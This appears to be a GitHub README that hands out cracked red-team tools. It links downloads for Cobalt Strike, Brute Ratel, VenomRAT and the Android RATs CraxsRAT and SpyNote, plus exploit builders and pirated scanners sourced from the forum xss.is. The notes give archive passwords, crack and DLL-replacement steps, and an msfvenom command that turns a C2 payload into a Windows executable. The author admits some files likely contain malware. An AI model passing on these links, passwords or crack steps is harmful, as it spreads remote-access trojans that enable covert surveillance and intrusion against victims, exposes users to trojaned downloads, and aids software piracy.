# ⚠️ WARNING ⚠️
As of 1/27/2024 these tools will not be checked for malware using any sort of environment, you are responsible for any damages done to your computer, run these strictly in a VM environment.<br><br>Make sure to read notes at the bottom before opening any issue.

# Cracked Red Teaming Tools.
This is a full collection of red teaming tools which have been cracked by other people, if you need me to find anything, let me know via the issues tab.
<br><br>

### ℹ Sandboxes ℹ
Sandboxing is useful when it comes to testing whether or not the tools contain malware, and it is *strongly* recommended to do so depending on the tool size.
| Name | Link | Description |
| :--- | ---- | ---: |
| AnyRun | [any.run](https://app.any.run/) | A (mostly) free online interactive VM/sandbox, one of the best out there, requires business e-mail, however limited to 5 minutes per sample including a 16MB sample size (Bypassable up to 100-300MB) for free tier accounts |
| TRIAGE | [tria.ge](https://tria.ge/) | A completely free online interactive VM/sandbox, less informative compared to AnyRun, however it needs just a singular log in using any email or even GitHub, with up to a 30-minute sample time limit and no sample size limit. |
| HybridAnalysis | [hybrid-analysis.com](https://hybrid-analysis.com/) | A completely (login-)free online sandbox, unlike the others it is not interactive, has a 100MB file size limit and has a very long queue to get your file analyzed. |
| JoeSandbox | [joesandbox.com](https://www.joesandbox.com/) | Appears to be a fully interactive online VM/sandbox with a 100MB file size limit, however I have never personally used it. |
| CUCKOO | [cuckoo.cert.ee](https://cuckoo.cert.ee/) | A non-interactive completely (login-)free online sandbox, appears to have no file size limit and I have rarely used it personally. |

### 🐀 C2/RATs 🐀
##### Windows
| Tool | Link |
| :--- | ---: |
| Cobalt Strike v4.9.1 | [Download](https://gofile.io/d/U25hhJ) |
| Brute-Ratel v1.4.5 (Blitzkrieg) | [UPDATING]() |
| SpecterInsightC2 | [UPDATING]() |
| VenomRAT v6.0.1 | [Download](https://pixeldrain.com/u/xVXeWbWb) |

##### Android
| Tool | Link |
| :--- | ---: |
| CraxsRAT v6? (⚠️ **READ NOTES** ⚠️) | [Download](https://pixeldrain.com/u/e3MdYXM7) |
| SpyNote v7.3.1 (⚠️ **READ NOTES** ⚠️) | [DOWN - Updated link may not come]() |

<br><br>
### 🎭 Exploitation Toolkits/Software 🎭
###### Windows
| Tool | Link |
| :--- | ---: |
| Immunity CANVAS v7.27 | [Download](https://pixeldrain.com/u/u8SeCmNe) |
| Quantum .lnk Exploit Builder (02-10-22) | [Download](https://pixeldrain.com/u/9zjpYNQn) |
| JexBot v1.0 (READ NOTES) | [Download](https://pixeldrain.com/u/Ea8kF2Hh) |
| MetaSploit Pro | [COMING]() |

<br><br>
### 🌐 Web App Security Tools 🌐
##### Windows
| Tool | Link |
| :--- | ---: |
| Invicti Pro v25.5 | [UPDATING]() |
| Burp Suite PRO v2023.12.1 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/burpsuite_installer_windows.bat)) | [UPDATING]() |
| Acunetix v25.1.250204093 ([Install Script](https://github.com/Ixve/Red-Team-Tools/blob/main/acunetix_installer_windows.bat)) | [UPDATING]() |
| Xray Pro v1.9.11 | [UPDATING]() |
| Super-Xray v1.7 | [COMING]()
| HCL AppScan Standard v10.6.0.28408 | [UPDATING]() |
| Nessus Professional v10.6.0 | [COMING]() |

##### Linux
| Tool | Link |
| :--- | ---: |
| Acunetix v25.1.250204093 | [UPDATING]() |
| Xray Pro v1.9.11 | [UPDATING]() |
| Nessus Professional v10.5.4 | [UPDATING]() |

### 🕷️ Debugging / Decompilation Tools 🕷️
| Tool | Link |
| :--- | ---: |
| IDA v9.1_250226 Keygen | [COMING]() |

<br><br>
# 📝 Notes 📝
###### General
Most of these tools are obtained from [CyberArsenal](https://cyberarsenal.org/) and [xss.is](https://xss.is/), credits for the cracks go to them.

Everything is re-uploaded to gofile.io due to speed issues with the pwn3rzs CDN (presumably overloaded), including the removal of archive passwords (unless I suspect there is malware, in which case they're password protected)


###### Brute-Ratel
This version is fully untested - no idea if it is broken or not.

The xmodlib file is cleared every start-up, including a license check being present every time you start Brute-Ratel.

Again, if it fails to compile the `badger.bin` payload into a executable, run the following: <br>
`cat badger.bin | msfvenom -p - -f exe --platform win -a x64 -o badger.exe`


###### CraxsRat V6(?)
High possibility of malware, run **strictly** in a virtual environment. I am not responsible for any damages caused to your host machine if you run it outside a VM.

Archive password: `suspicious`


###### JexBot
1. Run `add_hosts.bat` **as Administrator**
2. Run `Jex_crack.exe` then `JEX BOT.exe`
3. Put `mastercho` as the user/password combo

Note: After logging into jexbot you can close `Jex_crack.exe`, however you will need to run `Jex_crack.exe` every time you want to run jexbot.


###### Acunetix / Burp Suite
The install scripts are untested for the latest versions. If required, open a issue and I'll update the scripts.


###### SpyNote
This tool was obtained from `xss.is`

**HIGH CHANCE OF MALWARE**, triage analyses: <br>
https://tria.ge/250310-xf1qravjv9/behavioral1 <br>
https://tria.ge/250310-xf1qravjv9/behavioral2 <br>
https://tria.ge/250310-xf1qravjv9/behavioral3

NOTE: TCP requests -> `iis.nz`, attempts to identify if the tool is ran in a VM (presumably due to the Themida protection). <br>
**Network requests shouldn't be made at all unless it's the payload contacting the C2** - however it could also be the pre-placed IP address being pinged to make sure it's existent, which I have not checked out.

Archive password: `suspicious`


###### Xray
For Windows:<br>
Open a command prompt (or powershell if you prefer that), run scans as follows:<br>
`xray.exe ws --browser http://testphp.vulnweb.com --json-output testphp.json --html-output testphp.html`

For Linux:<br>
Open a terminal, run scans as follows:<br>
`./xray ws --browser http://testphp.vulnweb.com --html-output testphp.html`

Without rad/chrome:
`./xray ws --basic http://testphp.vulnweb.com --html-output testphp.html`

Missing Chrome "fix" (for using xray+rad): <br>
`sudo apt update` <br>
`wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb` <br>
`sudo apt install ./google-chrome-stable_current_amd64.deb` <br>
 Go to the launch script to insert `--no-sandbox` (e.g. `/opt/google/chrome/google-chrome`) <br>
 Last line of the file should look like this: <br>
`exec -a "$0" "$HERE/chrome" --no-sandbox "$@"`


###### Invicti Professional
1. Import the registry file so the knowledgebase properly renders<br>
2. Run `NetSparker.exe`<br>
3. Optional: Disable telemetry, system proxy, enable dark mode, etc


###### HCL AppScan Standard
**Make sure to replace the DLLs with the cracked ones**




###### To be added:
- de4dot (pre-compiled)
- AppSpider Full
- HTTP Debugger Pro
- Glasswire Elite
- Anything suggested in the issues tab (Nothing, for now)
